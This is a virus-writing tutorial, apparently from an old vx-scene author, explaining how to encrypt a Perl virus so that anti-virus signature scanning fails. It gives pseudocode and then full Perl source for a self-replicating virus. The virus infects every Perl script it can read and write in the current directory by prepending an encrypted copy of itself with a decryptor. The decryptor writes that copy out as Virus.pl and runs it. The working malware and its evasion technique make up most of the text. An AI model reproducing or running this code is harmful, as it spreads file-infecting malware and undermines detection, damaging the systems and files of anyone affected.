@@ -1,0 +1,88 @@
+
+ Encryption in Perl Viruses
+ by SnakeByte [ SnakeByte@kryptocrew.de ]
+ www.kryptocrew.de/snakebyte/
+
+
+ This tutorial describes how to use encryption in a perl virus, to make detection
+ by simple string scanning useless or to reduce the scanstring, so anti virus
+ companies have to implement a real emulation or heuristic for perl viruses.
+ 
+ Ok, let's start. I don't know if it is possible to write selfmodifying code in
+ perl, but i think it isn't. So we have to use a different way than in asm viruses.
+ The one I will describe here works the following. When infecting a file, we place
+ the entire virus into a encrypted string and a decryptor after it, which decrypts
+ the string and writes it to a file, which gets started afterwards. To make it more 
+ clear some pseudo code of a prepending, encrypted perl virus.
+
+ #!/bin/bash
+ # Virus Mark
+ $Virus="encrypted virus"
+ open file
+ write virus into file
+ close file
+ start file
+ [ .. infected host  ]
+ 
+
+ The Virus then does the following :
+
+ open own file + read it into a string
+ foreach $File (<*>)
+ open file + check for perl and infection mark
+ encrypt string
+ write string and decryptor to the file
+ close target file
+
+ Seems pretty easy, doesn't it ? Ok, let's get to the real code :
+
+
+ <---------------------------------------------------------------
+ #!/usr/bin/perl
+ # Encrypted Perl Virus by SnakeByte
+
+ open(File,$0);					# open our file
+ @Virus=<File>;					# to read ourselves
+ close(File);  
+ $Virus=join("\n", @Virus);
+ foreach $FileName(<*>) {
+  if ((-r $FileName) && (-w $FileName) && (-f $FileName)) {
+   open(File, "$FileName");
+   @Temp=<File>;
+   close(File);
+   if ((@Temp[0] =~ /perl/i ) or (@Temp[1] =~ /perl/i )) {
+    if (@Temp[1] !~ "Virus") {
+     $Key = int(rand(255));
+     for ( $X = 0; $X < length($Virus); $X++ ){# Encrypt it
+						# we get each char, convert it to
+						# the Ascii Value and add the Key
+      @Crypt[$X] = (ord(substr($Virus, $X, 1))) + ($Key);
+     }
+     $VirString = join("!", @Crypt);		# all values get seperated by a !
+    
+     @Vir[0] = "\#\!\/usr\/bin\/perl";
+     @Vir[1] = "# Encrypted Perl Virus by SnakeByte ";		# infection mark
+     @Vir[2] = "\$Virus = \"$VirString\"\;";
+     @Vir[3] = "\$Key = $Key\;";				# key to decrypt
+     @Vir[4] = "\@Virus = split(\"\!\", \$Virus)\;";
+     @Vir[5] = "for ( \$X = 0\; \$X < (\@Virus)\; \$X++ ) { ";  # Decrypt Loop
+     @Vir[6] = " \$Vir .= chr(\@Virus[\$X]-\$Key)\;";		# Decrypt Char
+     @Vir[7] = "}\" ;
+     @Vir[8] = "open(File, \"\>Virus.pl\")\;";		# write encrypted
+     @Vir[9] = "print File \$Vir\;";			# string to a file
+     @Vir[10] = "close(File)\;";
+     @Vir[11] = "\$a = \`perl Virus.pl\`;";		# and start it
+
+     $Temp = "@Vir\n@Temp";			# put the Arrays together
+     open(File, ">$FileName");			# and write the infected
+     print File $Temp;				# file back to disk
+     close(File);
+    
+    }		# infection mark check
+   }		# infect end
+  }		# filecheck end
+ }		# foreach end searchloop
+
+
+
+ <---------------------------------------------------------------
